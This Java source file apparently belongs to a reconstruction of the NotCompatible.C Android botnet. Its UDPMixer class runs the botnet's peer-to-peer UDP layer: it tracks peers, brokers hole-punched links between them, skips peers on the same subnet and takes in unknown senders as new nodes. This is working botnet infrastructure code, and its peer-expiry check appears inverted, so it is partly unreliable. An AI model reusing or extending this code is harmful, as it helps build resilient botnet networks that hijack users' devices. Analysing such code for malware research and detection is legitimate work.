package diff.notcompatible.c.bot.net.udp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;

import diff.notcompatible.c.bot.ThreadServer;
import diff.notcompatible.c.bot.net.udp.objects.UDPPointList;
import diff.notcompatible.c.bot.net.udp.objects.UDPRemPointListItem;

public class UDPMixer extends UDPSocket {
	
	public UDPPointList list;
	public ThreadServer owner;

	public UDPMixer(ThreadServer newOwner) {
		super(newOwner.nio.selector);
        list = new UDPPointList(this);
        owner = newOwner;
	}
	
	public void check() {
        long currentTime = System.currentTimeMillis();
        for(int i = 0; i < count(); i++) {
        	UDPPoint udpPoint = list.getByIndex(i);
        	if(udpPoint.lastChangeTime + 60000 > currentTime || udpPoint.endPoint.getAddress().getHostAddress().equals(owner.ip)) {
        		udpPoint.doDelete(udpPoint.isEncrypt);
        	} else {
        		udpPoint.check();
        	}
        }
	}
	
	public void createU2ULink() {
		for(int i = 0; i < count(); i++) {
			UDPPoint udpPoint = list.getByIndex(i);
			UDPRemPointListItem rplItem = udpPoint.remlist.getCandidate();
			if(rplItem != null && list.getByInetSocketAddress(rplItem.addr) != null) {
				udpPoint.sendPUSH(rplItem.addr.getAddress().getHostAddress(), rplItem.addr.getPort());
				rplItem.status = 1;
				UDPPoint upLink = createLink(rplItem.addr.getAddress().getHostAddress(), rplItem.addr.getPort());
				upLink.lastChangeTime = System.currentTimeMillis() + 30000;
				upLink.keepByte = (byte) 0x03;
				upLink.sendKEEP();
			}
		}
	}
	
	public UDPPoint createLink(String ip, int port) {
		UDPPoint upLink = null;
        InetSocketAddress epAddr = new InetSocketAddress(ip, port);
        
        if(list.getByInetSocketAddress(epAddr) == null && !checkSubnet(ip)) {
        	upLink = new UDPPoint(this);
        	upLink.endPoint = epAddr;
        	upLink.lastChangeTime = System.currentTimeMillis();
            list.add(upLink);
        }
        
        return upLink;
    }
	
	public int count() {
		return list.count();
	}
	
	public int getConnections() {
		int connections = 0;
		
		for(int i = 0; i < count(); i++)
			if(((UDPPoint) list.getByIndex(i)).isEncrypt)
				connections++;
		
		return connections;
	}
	
	public int getCandidates() {
		return list.getCandidates();
	}
	
	// Check if ip address same subnet as any P2PLinks
	public boolean checkSubnet(String ipToCheck) {
        byte[] ip = ip2byte(ipToCheck);
        
        for(int i = 0; i < count(); i++) {
        	byte[] ip2 = list.getByIndex(i).endPoint.getAddress().getAddress();
        	if(ip[0] == ip2[0] &&
        			ip[1] == ip2[1] &&
        			ip[2] == ip2[2])
        		return true;
        }
        
        return false;
	}
	
    public static byte[] ip2byte(String IP) {
        byte[] b = new byte[4];
        
        String[] x = IP.split("\\.", 4);
        b[0] = (byte) (Integer.parseInt(x[0]) & 0xFF);
        b[1] = (byte) (Integer.parseInt(x[1]) & 0xFF);
        b[2] = (byte) (Integer.parseInt(x[2]) & 0xFF);
        b[3] = (byte) (Integer.parseInt(x[3]) & 0xFF);
        
        return b;
    }

    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);
        try {
            ByteBuffer tmp = ByteBuffer.allocate(8192);
            tmp.clear();
            InetSocketAddress sa = (InetSocketAddress) channel.receive(tmp);
            byte[] tmp2 = new byte[tmp.position()];
            System.arraycopy(tmp.array(), 0, tmp2, 0, tmp.position());
            UDPPoint up = list.getByInetSocketAddress(sa);
            if (up == null) {
                up = new UDPPoint(this);
                up.endPoint = sa;
                list.add(up);
            }
            up.onRecv(tmp2);
        } catch (Exception exception) {
        	exception.printStackTrace();
        }
    }
}
